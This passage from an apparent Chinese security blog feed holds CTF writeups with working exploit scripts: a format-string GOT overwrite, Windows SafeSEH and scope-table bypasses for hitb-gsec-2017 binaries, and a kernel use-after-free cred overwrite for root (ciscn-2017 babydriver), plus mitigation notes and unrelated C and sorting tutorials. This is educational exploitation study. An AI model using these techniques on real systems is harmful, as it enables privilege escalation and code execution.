0x100) - 0x58) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x100) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 1)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x10000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 2)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x1000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 3)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x100000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 4)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')r.sendline('1')r.sendlineafter('input the size', str(0x80))fmt = "%c%c%c%c%c%c%c%c%c%c%c%" + str(((system / 0x10000000000) % 0x100) - 11) + "x%hhn"fmt = fmt.ljust(0x38, "a")fmt += p64(0x602018 + 5)[:6]r.sendafter('input your content: ', fmt)sleep(1)maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/w4rd3n'r.sendline(maps)r.recvuntil('Your choice : \n')add(0x60, "/bin/sh\x00")r.sendline('2')print "libc: " + hex(libc)print "system: " + hex(system) #gdb.attach(r)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Windows-pwn-SafeSEH绕过]]></title>
    <url>%2Fposts%2Fd9e779e4%2F</url>
    <content type="text"><![CDATA[概览SEH和SafeSEH是Windows的异常处理机制与其对应的安全策略. 攻击返回地址或者虚函数可以直接绕过SafeSEH,这里主要记录一下通过SEH和SafeSEH劫持控制流的方法. 利用未启用SafeSEH且不是纯IL的模块绕过SafeSEH. 将shellcode部署在堆中以绕过SafeSEH. DEP关闭时,可以利用加载模块之外的指令作为跳板. 存在scope table,可以劫持scope table中的两个函数指针.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>winpwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Windows-pwn-基础]]></title>
    <url>%2Fposts%2F6dffab5f%2F</url>
    <content type="text"><![CDATA[概览Win和Linux上二进制漏洞利用的差别主要体现在不同的程序保护机制,堆管理机制和进程管理机制等上面. 函数调用x86架构的微软操作系统使用stdcall:参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. x86-64架构的微软操作系统的前四个整型参数使用rcx,rdx,r8,r9存储,使用xmm0到xmm3来放置浮点参数,其他的参数入栈(从右至左向8字节对齐). 同时x86-64中调用者有一个职责:在调用函数之前(无论实际的传参使用多大空间),在栈上的函数返回地址之上(靠近栈顶)分配一个32字节的影子空间,并且在调用结束后恢复.影子空间是给rcx,rdx,r8,r9保存值的,对于少于四个参数的函数也要分配影子空间. 进程管理机制Windows通过TEB和PEB结构体管理进程. TEB &amp;&amp; PEBTEB(Thread Environment Block,线程环境块),一个进程的线程环境块中存放着该进程中所有线程的各种信息. ntdll.NtCurrentTeb()函数用来返回当前线程的TEB结构体指针,也就是FS:[0x18]的值,FS:[0]的值为SEH的起始地址. PEB(Process Envirorment Block,进程环境块),PEB是存放着进程信息的结构体. 线程TEB结构体中,每个TEB + 0x30(FS:[0x30])中都指向同一个地址,也就是该进程的PEB(TEB.ProcessEnvironmentBlock). 程序保护使用winchecksec可检测保护机制(不一定正确). SafeSEHSafeSEH是为了防止通过覆盖堆栈上的异常处理函数句柄从而控制程序执行流程的攻击,基本原理即在调用异常处理函数之前对其进行一系列的有效性校验. SafeSEH需要OS和Compiler的双重支持. 通过启用/SafeSEH链接选项可使编译好的程序具备SafeSEH功能,该选项会将所有异常处理函数地址提取出来编入SEH表中,并将这张表放到程序的映像里用于检验. SafeSEH机制从RtlDispatchException()开始:如果异常处理链不在当前程序的栈中,则终止异常处理调用;如果异常处理函数的指针指向当前程序的栈中,则终止异常处理调用; 通过后调用RtlIsValidHandler()进行异常处理有效性检查.下面是Alex披露的RtlIsValidHandler()的伪代码. 1234567891011121314151617181920212223242526272829303132333435363738BOOL RtlIsValidHandler( handler ) &#123; if (handler is in the loaded image) &#123; //在加载模块的内存空间内 if (image has set the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) //程序设置了忽略异常处理 return FALSE; if (image has a SafeSEH table) //含有SafeSEH表说明程序启用了SafeSEH if (handler found in the table) //异常处理函数地址在表中 return TRUE; else return FALSE; if (image is a .NET assembly with the ILonly flag set) //包含IL标志的.NET中间语言程序 return FALSE; else return TRUE; &#125; if (handler is on non-executable page) &#123; //在不可执行页上 if (ExecuteDispatchEnable bit set in the process flags) //DEP关闭 return TRUE; else //访问违例异常 raise ACCESS_VIOLATION; &#125; if (handler is not in an image) &#123; //在可执行页上,但在加载模块之外 if (ImageDispatchEnable bit set in the process flags) //允许加载模块内存空间外执行 return TRUE; else return FALSE; &#125; return TRUE;&#125; RtlIsValidHandler()函数只有在以下三种情况下允许异常处理函数的执行. 异常处理函数指针位于加载模块内存范围外,并且可执行. 异常处理函数指针位于加载模块内存范围内,相应模块未启用SafeSEH且不是纯IL. 异常处理函数指针位于加载模块内存范围内,相应模块启用SafeSEH且函数地址在SEH表中. Win7及以上版本添加了对MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE的check,只有当其第六个比特为1时才可在加载模块内存范围外执行. Win10多了一个Check函数ntdll!RtlpIsValidExceptionChain,该函数会去获得当前SEH Chain的next域的值去和SEH表存放的值进行比较. GSGS保护机制是编译器在函数前后添加额外的处理代码,同时在程序开始时将由伪随机数生成的Cookie放入.data段.添加的代码前部分用于向栈中插入Cookie,它位于局部变量和返回地址之间.后部分在函数返回时调用security_check_cookie函数,以判断Cookie是否被更改过. win10在栈桢初始化完毕后用EBP异或Cookie,作为当前函数的Cookie,以此区别不同函数,在函数返回前,用EBP异或还原出Cookie种子. CFG微软在Win10和Win8.1 Update 3中默认启用了一个新的机制,控制流保护(CFG). 为了完全实现CFG,编译器和操作系统都必须支持它.作为系统层面的利用缓解措施,CFG的实现需要联合编译器,操作系统用户层库和内核模块.Work-in-Progress Security Feature说明了使用CFG时开发者需要做的步骤. CFG机制主要集中在间接调用(调用的目标地址在运行时决定)的保护上. 启用CFG后,会在间接调用之前将目标地址传给_guard_check_icall函数,在其中实现CFG. 在没有CFG支持的Windows中,这个函数不做任何事.有CFG支持时它指向ntdll!LdrpValidateUserCallTarget函数.这个函数利用了一个结构检测目标地址的可靠性,也就是CFGBitmap,在进程空间中每8个字节对应CFGBitmap中的一位.如果这8字节中有函数的起始地址,则在CFGBitmap中对应的位设置为1,否则设置为0; ntdll!LdrpValidateUserCallTarget函数操作如下. 首先找到目标地址对应的CFGBitmap中的位,即将目标地址高3个字节作为该目标地址对应位所处元素(元素大小是4字节)在CFGBitmap的偏移,如果目标地址以0x10对齐,则第一个字节的第四位到第八位代表的数为其在单位内的位偏移值.如果目标地址不以0x10对齐,则位偏移值为前者与1或运算. 如果位等于1,意味着间接调用的目标是可靠的,函数将返回并继续执行间接调用.如果位等于0,意味着间接调用的目标是不可靠的,将触发异常阻止不可靠地址的运行. 检测CFG使用dumpbin.exe /all file可以看到该程序关于CFG的支持信息(Load Config Table部分). Guard CF address of check-function pointer:就是_guard_check_icall函数的地址,有CFG支持时将被修改成nt!LdrpValidateUserCallTarget函数的地址. Guard CF function table:函数的相对虚拟地址(RVA)列表的指针,其包含了程序的代码.CFGBitmap的位信息来自Guard CF function table. Guard CF function count:函数RVA数量. CF Instrumented:表明程序中启用了CFG.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>winpwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hitb-gsec-2017-winpwn]]></title>
    <url>%2Fposts%2F748eb64e%2F</url>
    <content type="text"><![CDATA[babyshellcode 这里工具对SafeSEH检测出现了问题,实际上是开了的. name的输入存在溢出,后面printf存在泄露,这个溢出不能利用,因为无可利用的地址. Create shellcode对堆的申请使用的是VirtualAlloc,同时参数flprotect值为0x40,表示拥有RWE权限. Run shellcode中存在memcpy导致的栈溢出,触发的同时会修改堆内存的前四个字节为0xffffffff,然后调用触发异常处理. 现在的思路就是绕过SafeSEH执行heap addr + 0x4. 由于MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE的check,直接修改SEH Handler为heap addr + 0x4是不行的. 这里需要使用scmgr.dll,它是一个未开启SafeSEH的模块(使用OllySSEH插件查看)且自带system(&quot;cmd&quot;). 现在问题就变成怎么获取其基址.(scmgr.dll每次进程重启的时候基址都不变) 这里利用的是Set ShellcodeGuard中的加密算法,算法初始化的时候,加密的是scmgr!init_scmgr的地址. 把这个算法dump出来正向爆破去算,如果结果等于最后加密的结果,说明这就是基址. 获取到基址之后,就能够构造SEH Handler指向scmgr!getshell_test(异常处理函数指针位于加载模块内存范围内,相应模块未启用SafeSEH且不是纯IL). Win10环境使用name处漏洞泄露SEH Chain的next域绕过check. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding=UTF-8from pwintools import *def get_scmgr_base(check): for base in range(0x60000000, 0x80000000, 0x10000): #0x8000000之上是内核空间 init_scmgr = base + 0x1090 g_table = [init_scmgr] for i in range(31): init_scmgr = (init_scmgr * 69069) &amp; 0xffffffff g_table.append(init_scmgr) g_index = 0 v0 = (g_index-1) &amp; 0x1f v2 = g_table[(g_index + 3) &amp; 0x1f] ^ g_table[g_index] ^ (g_table[(g_index + 3) &amp; 0x1f] &gt;&gt; 8) v1 = g_table[v0] v3 = g_table[(g_index + 10) &amp; 0x1F] v4 = g_table[(g_index - 8) &amp; 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) &amp; 0x1F])) &lt;&lt; 14) v4 = v4 &amp; 0xffffffff g_table[g_index] = v2 ^ v4 g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) &lt;&lt; 7)) &amp; 0xffffffff g_index = (g_index - 1) &amp; 0x1F if(g_table[g_index] == check): print "base: " + hex(base) return base + 0x1100r = Process("babyshellcode.exe")r.recv(200)r.sendline("aaaa" * 20)seh_next = u32(r.recv(200)[86:90]) - 108print "seh_next: " + hex(seh_next)r.sendline("5")r.recv(200)r.sendline("1")check = r.recv(200).split("-")[5][:8]check = int(check, 16)print "check: " + hex(check)get_shell = get_scmgr_base(check)r.sendline("w4rd3n")r.recv(200)shellcode = "a" * 0x70shellcode += p32(seh_next) + p32(get_shell)r.sendline("1")r.recv(200)r.sendline(str(len(shellcode)))r.recv(200)r.sendline("1")r.recv(200)r.sendline("1")r.recv(200)r.sendline(shellcode)r.recv(200)r.sendline("4")r.recv(200)r.sendline("0")r.interactive() 纪念以下第一次复现winpwn. babystack 这里工具对SafeSEH检测出现了问题,实际上是开了的. 开局给了栈地址和main函数地址.程序中还有个隐藏的system(&quot;cmd&quot;). 由于程序退出使用的是exit(0),所以劫持eip失效. 这里的思路还是通过SEH异常处理,由于没有合适的条件直接绕过SafeSEH劫持SEH Handler(这里会与SEH表比对),这里需要伪造scope table. 在主函数中scope table域指针被加密并放入了栈中. _except_handler4异常处理函数会调用VCRUNTIME140!_except_handler4_common,逆向其逻辑,其最后会调用HandlerFunc. 由于要覆盖scope table域指针同时维护SEH链所以要泄露SEH的next和handler,又因为是加密的所以还要泄露___security_cookie. VCRUNTIME140!_except_handler4_common中还对ebp - 0x1C处进行了检测,这个值是ebp异或___security_cookie,也需要fix. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding=UTF-8from pwintools import *r = Process("babystack.exe")r.recvline()stack = int(r.recvline().split("0x")[1], 16)main = int(r.recvline().split("0x")[1], 16)print "stack: " + hex(stack)print "main: " + hex(main)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 140))seh_next = int(r.recvline().split("0x")[2], 16) print "seh_next: " + hex(seh_next)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 144))seh_handle = int(r.recvline().split("0x")[2], 16) print "seh_handle: " + hex(seh_handle)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(main + 12116))security_cookie = int(r.recvline().split("0x")[2], 16) print "security_cookie: " + hex(security_cookie)fake_scope_table = security_cookie ^ (stack + 0x64)print "fake_scope_table: " + hex(fake_scope_table)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 128))check = int(r.recvline().split("0x")[2], 16) print "check: " + hex(check)r.recvline()r.sendline("go")payload = ""payload += "a" * 0x64payload += "\xe4\xff\xff\xff" + p32(0) + "\x20\xff\xff\xff" + p32(0)payload += "\xfe\xff\xff\xff" + p32(main + 664) + p32(main + 733)payload += p32(check) + "a" * 8 + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table)r.sendline(payload)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(0))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2017-babydriver]]></title>
    <url>%2Fposts%2F5b72592c%2F</url>
    <content type="text"><![CDATA[分析解包分析init,发现只是加载驱动等正常套路. 分析驱动发现由于存放指针的变量是全局变量,存在一个伪条件竞争引发的UAF漏洞. 利用思路打开两次设备,通过ioctl更改其大小为cred结构体的大小,释放其中一个,fork一个新进程,那么这个新进程的cred的空间就会和之前释放的空间重叠,此时就可以通过另一个文件描述符对cred空间写.需要确定cred结构体的大小,计算一下是0xa8(注意使用相同内核版本的源码). 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() &#123; int fd1 = open("/dev/babydev", 2); int fd2 = open("/dev/babydev", 2); ioctl(fd1, 0x10001, 0xa8); close(fd1); int pid = fork(); if (pid &lt; 0) &#123; exit(0); &#125; else if (pid == 0) &#123; char zeros[30] = &#123;0&#125;; write(fd2, zeros, 28); if (getuid() == 0) &#123; system("/bin/sh"); &#125; &#125; else &#123; wait(NULL); &#125; close(fd2); return 0;&#125; 1gcc exp.c -static -o exp]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-kernel-pwn-基础]]></title>
    <url>%2Fposts%2F3db9858b%2F</url>
    <content type="text"><![CDATA[概览kernel是一个软件,用于管理其他所有软件发出的数据I/O要求并将这其转义为指令交给CPU和计算机中的其他组件处理,并进行权限控制,系统调用,进程管理,内存管理等多项功能,kernel是现代操作系统最基本的部分. Intel CPU将CPU的特权级别分为4个级别:Ring 0 ~ 3.Ring 0只给OS使用,Ring 3所有程序都可以使用,内层Ring可以随便使用外层Ring的资源. 大多数的现代操作系统只使用了Ring 0和Ring 3.且在Linux等现代操作系统中,虚拟内存地址通常被划分为内核空间和用户空间.内核地址空间由所有进程共享,但只有运行在内核态的进程才能访问,用户进程可以通过系统调用切换到内核态访问内核空间. 在32位的linux系统中,每个进程会虚拟出4G的内存空间,其中3G是用户空间,1G是内核空间,用户空间的地址范围是0x00000000 ~ 0xBFFFFFFF,内核空间的地址是0xC0000000 ~ 0xFFFFFFFF. 系统调用指的是用户空间的程序向操作系统内核请求需要更高权限的服务,系统调用提供用户程序与操作系统间的接口. linux内核源码:https://github.com/torvalds/linux. linux内核源码在线查看:https://elixir.bootlin.com/linux/latest/source. linux内核内存分布图. LKM可加载核心模块(LKM)就是运行在内核空间的可执行程序,包括:驱动程序(如设备驱动,文件系统驱动),内核扩展模块(modules)等. LKM的文件格式和用户态的可执行程序相同,后缀常常是ko,因此可以直接用IDA等工具来分析.模块不能单独运行(就像一个动态链接库),它在运行时被链接到内核作为内核的一部分在内核空间运行. 12345678modinfo test.ko#获得模块信息insmod test.ko#加载内核模块,需要root权限lsmod#列出已加载的内核模块rmmod test.ko#卸载内核模块,需要root权限 ioctl是一种系统调用,用于与设备通信.设备驱动的代码允许在内核空间运行而且可以对设备直接寻址,通过ioctl用户空间可以跟设备驱动沟通从而与设备通信. 123int ioctl(int fd, unsigned long request, ...)//fd:打开设备时返回的文件描述符//第二个参数为用户程序对设备的控制命令,再后边的参数则是控制命令函数的参数 内核模块程序的结构中包括一些callback回调表,对应的函数存在一个file_operations结构体中,结构体中实现了的回调函数就会初始化为对应函数地址,而未实现为NULL. 状态切换当发生系统调用,异常,外设产生中断等事件时,会发生用户态到内核态的切换. 具体的过程为. 通过swapgs切换GS段寄存器,将GS寄存器值和一个特定位置的值进行交换,保存用户态GS值同时设置内核GS值; 将当前栈顶(用户空间栈顶)保存到CPU独占变量区域里,将CPU独占区域里记录的内核栈顶放入rsp/esp; 通过push保存用户态上下文; 通过汇编指令判断是否为x32_abi; 最后通过系统调用号跳到全局变量sys_call_table相应位置继续执行系统调用. 从内核态退出到用户态时流程为:通过swapgs命令恢复GS(随后还会pop ebp);通过sysretq或者iretq恢复到用户控件继续执行.使用iretq还需要给出用户空间的一些信息(CS,eflags/rflags,esp/rsp等). 内核态函数内核态函数与户态库函数不同,这里列举一些. printf() -&gt; printk(),printk()不一定会把内容显示到终端上,但一定在内核缓冲区里,可以通过dmesg查看.memcpy() -&gt; copy_from_user()/copy_to_user():用户空间和内核空间之间数据交流,还有拷贝简单类型数据的put_user/get_user.malloc() -&gt; kmalloc(),kmalloc()使用的是slab/slub分配器.free() -&gt; kfree(),同kmalloc(). kptr_restrict/dmesg_restrict内核提供控制变量/proc/sys/kernel/kptr_restrict用于控制内核的一些输出打印. kptr_restrict == 2:内核将符号地址打印为全0,root和普通用户都没有权限. kptr_restrict == 1:root用户有权限读取,普通用户没有权限. kptr_restrict == 0:root和普通用户都可以读取. 同样的,设置/proc/sys/kernel/dmesg_restrict为1禁止普通用户查看demsg信息. 内核关键结构体每个线程在内核中都对应一个线程栈,一个线程结构体thread_info,结构体同时也包含了线程的一系列信息. 12345678struct thread_info &#123; unsigned long flags; /* low level flags */ int preempt_count; /* 0 =&gt; preemptable, &lt;0 =&gt; BUG */ struct task_struct *task; /* main task structure */ mm_segment_t addr_limit; /* thread address space */ __u32 cpu; /* current CPU */ unsigned long thr_ptr; /* TLS ptr */&#125;; thread_info中最重要的信息是task_struct结构体,task_struct结构体有一个成员就是该线程对应的cred结构体. 12345678910111213141516171819202122struct task_struct &#123; volatile long state; /* -1 unrunnable, 0 runnable, &gt;0 stopped */ void *stack; atomic_t usage; unsigned int flags; /* per process flags, defined below */ unsigned int ptrace; //... const struct cred __rcu *ptracer_cred; /* Tracer's credentials at attach */ const struct cred __rcu *real_cred; /* objective and real subjective task * credentials (COW) */ const struct cred __rcu *cred; /* effective (overridable) subjective task * credentials (COW) */ char comm[TASK_COMM_LEN]; /* executable name excluding path - access with [gs]et_task_comm (which lock it with task_lock()) - initialized normally by setup_new_exec */ //...&#125;; 12345678910111213141516171819struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ //...&#125;; cred结构体在线程初始化由prepare_creds函数创建,创建cred结构体的方法是kmem_cache_alloc.可以通过修改cred结构体中的uid ~ fsgid(前28字节)为0获取root权限.也可以执行commit_creds(prepare_kernel_cred(0))获得root权限. 当用户对tty驱动分配的设备节点调用open时,tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说对驱动设备调用open函数后内核会通过kmalloc申请一个tty_struct结构体.而tty_struct结构体有一个成员:const struct tty_operations *ops;,是一个存放函数指针的结构体(类似虚函数表). 这里使用的分配机制为slub,所以可以通过uaf控制tty_struct结构体来指向伪造的tty_operations,从而劫持控制流. 1234567891011struct tty_operations &#123; struct tty_struct * (*lookup)(struct tty_driver *driver, struct file *filp, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, const unsigned char *buf, int count); //more&#125; __randomize_layout; 内核符号表kallsyms抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进kernel image,相当于内核中存了一个System.map. 要在一个内核中启用kallsyms功能,须设置CONFIG_KALLSYMS选项为y,如果要在kallsyms中包含全部符号信息,须设置CONFIG_KALLSYMS_ALL为y. kallsyms表位于/proc/kallsyms,mod_tree是一块包含了模块指针的内存地址的内核地址. 1234sudo sysctl -w kernel.kptr_restrict=0grep mod_tree /proc/kallsymscat /proc/kallsymscat System.map 系统slab信息12cat /proc/slabinfo#... 内核态保护除了拥有用户态的保护手段,内核态还有特有的保护方式. KPTI(Kernel PageTable Isolation):进程地址空间被分成了内核地址空间和用户地址空间,其中内核地址空间映射到了整个物理地址空间,而用户地址空间只能映射到指定的物理地址空间.内核地址空间和用户地址空间共用一个页全局目录表,为了彻底防止用户程序获取内核数据,可以令内核地址空间和用户地址空间使用两组页表集.Windows上把这个叫KVA Shadow. SMEP(Supervisor Mode Execution Protection):当处理器处于Ring 0模式,执行用户空间的代码会触发页错误(在ARM中该保护称为PXN). SMAP(Superivisor Mode Access Protection):类似于smep,访问户空间的数据会触发页错误. KASLR:地址随机化. Stack Protector:关于函数返回地址的检测,属于CFI(Control Flow Integrity,控制流完整性保护)中的后向控制流完整性保护. CR4寄存器用于存储内核的标志位. 上传二进制文件123exp_base = system("base64 exp")r. sendline("echo " + exp_base + " &gt; exp.txt")r. sendline("base64 -d exp.txt &gt; exp")]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-basis-CSAPP-优化程序性能]]></title>
    <url>%2Fposts%2Fe1723d14%2F</url>
    <content type="text"><![CDATA[程序的性能程序的性能主要分两个方面:耗时和内存占用.从算法的角度来说可以通过选择适当的算法和数据结构增加程序性能. 这里主要讨论怎么写出编译器能够有效优化以转化为高效可执行代码的源代码和如何利用并行获取最高性能. 在写代码时减少过程调用,减少不必要的内存引用.减少的方式是将结果用变量保存,这种思想与算法中动态规划以空间换时间的思想吻合.]]></content>
      <categories>
        <category>CS</category>
        <category>basis</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pl-C-基础]]></title>
    <url>%2Fposts%2Fb5a1a3e4%2F</url>
    <content type="text"><![CDATA[环境一个简单的C语言源代码. 1234567891011#include&lt;stdio.h&gt; //预处理指令int main() &#123; //函数定义 printf("Hello World"); //语句,函数调用,传参 return 0; //返回语句&#125; 它并不能直接运行,而是需要一个编译环境将其从源代码编译成可执行程序,然后再在编译环境对应运行环境中运行. C语言的编译过程可以划分为:预处理,gcc编译器编译(C语言到汇编代码),汇编器汇编(汇编代码到机器代码),链接(目标文件到可执行文件). 词法C语言作为一门计算机语言,和大部分语言结构是类似的.由空格(或TAB,换行)分隔一个个标记(token,就像英语中的单词),由;划分一个个语句(#预处理以换行分隔)).其支持的字符至少包括所有大小写字母,数字和其他字符(貌似正常键盘的字符都行).标准还定义了三字母词用于某些缺失必需字符的环境.同时还有字符串中的转义字符. C语言支持以/*开始,*/结束的注释.也支持以//注释本行中//后面的所有字符(不写注释的程序员都不是一个好的Web手). 标识符是变量,函数,类型等的名字,由大小写字母,数字和下划线组成,但不能以数字开头(虽然对长度没限制,但标准允许编译器忽略第31个字符以后的字符). C语言关键字不能作为标识符,如auto,if,int等. 数据C语言中仅有4种基本数据类型:整型,浮点型,指针和聚合类型.所有其他类型都是由基本类型的某种组合派生而来. 整型整型包括char,short,int,long,long long,并且都有对应的有符号和无符号版本. char大小为1字节,后三者在标准中是这样规定的:长整型至少和整型一样长,整型至少和短整型一样长. 对应类型能表示的具体范围看对应版本源码的limits.h头文件. 字面值其实就是指在程序中直接出现的值,例如:a = 3;中3就是一个整型字面值. 枚举类型实际上也是整型类型,且枚举类型的变量以整型存储. 浮点型浮点型包括float,double,long double,分别提供单精度,双精度以及某些支持扩展精度的机器上的扩展精度. 对应类型能表示的具体范围看对应版本源码的float.h头文件. 指针每一个变量相当于对一块对应大小的存储空间的应用,将内存的位置关系叫做地址,指针就是地址. 实际上指针也是以整数形式存储,且大小始终未当前操作系统的字长(因为其要能完整表示整个内存地址空间). tips在C语言中,字符串就是一串以NUL字节结尾的字符数组,NUL作为字符串终止符,不被看做字符串的一部分,且一个字符串常量在表达式中实际上是以指针的形式存在. 声明变量声明的基本形式:说明符(一个或多个) 声明表达式列表. 说明符用于说明要声明的变量类型,声明表达式列表一般为变量的标识符和初始化语句. 例如:int a;,unsigned long long a, b = 2;. typedefC语言支持使用typedef为各种数据类型定义新名字.例如:typedef char * char_ptr;. const使用了const限定符的变量被称为常量变量,其与普通变量的区别在于常量变量必须初始化,且初始化后不能再改变(作为形参的常量变量可以获得实参的值). 当对指针变量使用const时又有一点区别.int * const p,表示指针p是常量变量,不能对p赋值.int const * p,表示p指向的变量为常量变量. 其实const的限制只体现在编译器层面,汇编层面常量变量和普通变量是一样的. 作用域]]></content>
      <categories>
        <category>programming language</category>
      </categories>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-algorithm-排序算法]]></title>
    <url>%2Fposts%2F87acfedc%2F</url>
    <content type="text"><![CDATA[概览经典的算法问题模型,对于一个元素数组,根据其主键(如整数数组的数值)的全序关系(如数值的大小关系)进行排序. 排序算法模板类. 1234567891011121314151617181920212223242526272829public class Example &#123; public static void sort(Comparable[] a) &#123; /* code */ &#125; private static boolean less(Comparable v, Comparable w) &#123; return v.compareTo(w) &lt; 0; &#125; private static void swap(Comparable[] a, int i, int j) &#123; Comparable t = a[i]; a[i] = a[j]; a[j] = t; &#125; private static void show(Comparable[] a) &#123; for (int i = 0;i &lt; a.length;i++) &#123; StdOut.print(a[i] + " "); &#125; StdOut.println(); &#125; public static boolean isSorted(Comparable[] a) &#123; for (int i = 1;i &lt; a.length;i++) &#123; if (less(a[i], a[i - 1])) &#123; return false; &#125; return true; &#125; &#125; public static void main(String[] args) &#123; String[] a = In.readStrings(); sort(a); assert isSorted(a); show(a); &#125;&#125; 选择排序核心思想:取出数组元素中的最值,放入另一个数组,另一个数组将被维护成一个被排序的数组. 其运行时间与输入无关.数据移动次数是最少的. 123456789101112131415public class Selection &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 0;i &lt; N;i++) &#123; int min = i; for (int j = i + 1;j &lt; N;j++) &#123; if (less(a[j], a[min])) &#123; min = j; &#125; &#125; swap(a, i, min); &#125; &#125; /* code */&#125; 插入排序核心思想:类似桥牌,将每一个元素插入到有序的元素数组中的正确位置,同时将其于元素移动(数组大小增加). 其运行时间和数据移动次数与输入有关.对于倒置数量越小的数组此算法效率越高. 1234567891011public class Insertion &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 1;i &lt; N;i++) &#123; for (int j = i;j &gt; 0 &amp;&amp; less(a[j], a[j - 1]);j--) &#123; swap(a, j, j - 1); &#125; &#125; &#125; /* code */&#125; 希尔排序核心思想:基于插入排序,首先保证数组任意间隔为x的元素是有序的,从而使移动次数减少,n逐渐递减为1(即插入排序). 123456789101112131415public class Shell &#123; public static void sort(Comparable[] a) &#123; int N = a.length; int x = 1; while (x &lt; N / 3) x = x * 3 + 1; while (x &gt;= 1) &#123; for (int i = x;i &lt; N;i++) &#123; for (int j = i;j &gt;= x &amp;&amp; less(a[j], a[j - x]);j -= x) &#123; swap(a, j, j - x); &#125; &#125; x = x / 3; &#125; &#125;&#125; 归并排序核心思想:对于两个有序数组,利用偏序关系的传递性减少数据的移动和大小比较. 1234567891011121314151617181920212223242526272829public class Merge 